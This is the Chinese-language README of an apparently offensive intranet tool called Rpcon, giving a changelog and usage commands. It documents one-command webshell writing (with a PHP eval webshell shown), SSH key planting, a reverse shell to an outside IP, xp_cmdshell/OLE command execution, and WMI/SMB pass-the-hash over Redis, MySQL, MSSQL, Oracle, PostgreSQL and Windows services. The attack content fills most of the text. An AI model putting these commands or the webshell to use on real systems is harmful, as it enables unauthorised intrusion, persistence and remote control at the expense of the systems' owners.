# Rpcon

 内网远程连接利用工具，用于ssh smb 等常规服务Cancel changes

目前支持ssh远程连接执行命令

## 2023.3.24更新：

redis远程连接执行命令 redis一键写入webshell，一键反弹shell，一键写入公钥

## 2023.3.26更新：

mysql远程连接执行命令 mysql一键写入webshell 

## 2023.3.27更新：

wmiexec无回显命令执行

## 2023.3.28更新：

优化某些代码

mssql模块

1：xcmdhshell 一键利用

2：OLE一键利用

## 2023.3.29更新：

oracle利用模块：shellrun函数执行系统命令

关于oracle模块报错

## 2023.3.30更新：

暂时移除oracle 使用可以从cmd/oracle.go import包中去除//再按照上文参考配置

Postgersql模块

1：一键写入webshell

2：命令执行

Smb模块
## 2023.4.4更新
解决linux打包问题



使用方法：

```
写入shell默认为<?php @eval($_POST[1]);?>
-p 指定端口
-f 指定文件  列入shell文件 
-pt 写入目录
-u 用户
-pw 密码
-d 指定数据库名称
-c 执行的命令或者数据库语法

mysql:
执行查询
rpcon -u root -pw root -m mysql -c "show databases;"
一键写shell：
rpcon  -u root -pw root -r mysl -f sss/1.php -pt /var/html/www 
一键读取配置
rpcon -u root -pw root -r mycg

redis:
执行查询
rpcon -u  -pw -m redis -c ""
一键写入公钥
rpcon -u -pw -r rk -pt rsa.xx
一键写入shell
rpcon -u -pw -r rs  -f 11.php -pt 目标目录
一键反弹shell  <有点鸡肋某些情况会反弹失败>
rpcon -u -pw -r rn   -ws 8.8.8.8 -wp 666


mssql
执行查询:
rpcon -u sa -pw sa -m mssql -c ""
读取配置：
rpcon -u sa -pw sa -r mssg 
执行命令
rpcon -u sa -pw sa -r cmdshell -c whoami
rpcon -u sa -pw sa -r oleshell -c whoami

oracle:
执行查询:
rpcon  -u sys -pw sys -m oracle -c ""
读取配置
rpcon -u sys -pw sys -r org 
执行命令
rpcon -u sys -pw sys -r ors -c whoami

postgresql
执行查询：
rpcon -u postgres -pw 123456 -m postgres -c ""
读取配置
rpcon -u postgres -pw 123456 -r pocfg 
写入shell
rpcon -u postgres -pw 123456 -r poshell -f 11.php -pt /var/html/www
执行命令
rpcon -u postgres -pw 123456 -r pocde -c whoami


wmicexec:
rpcon -u administratros -pw 123456 -m wmi -c 
hash：
rpcon -u administrators -hash aaaaaaaaa -m wmi -c 

smb:
rpcon -u administrators -pw 123456 -f 文件 -pt 目录
hash:
rpcon -u administrators -hash aaaaaaaaa -f 文件 -pt 目录
```

